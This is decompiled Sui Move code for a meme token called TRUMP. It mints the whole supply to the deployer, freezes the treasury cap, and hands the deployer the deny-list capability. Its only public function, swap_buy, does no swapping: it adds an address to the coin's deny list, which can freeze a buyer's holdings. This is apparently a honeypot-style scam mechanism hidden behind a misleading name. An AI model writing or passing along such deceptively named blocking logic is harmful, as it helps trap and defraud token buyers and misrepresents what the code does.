module 0xed77985eb3df694f656cebb9ca198bc14789548abc35d2892867c446bf5b414a::trump {
    struct TRUMP has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TRUMP, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TRUMP>(arg0, 9, b"TRUMP", b"Trump Will Fix It", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTx7cUovUN2gspEN9QKoYugrLDZerJPDwu5M7e9YZGBp6"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TRUMP>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TRUMP>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TRUMP>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TRUMP>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TRUMP>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

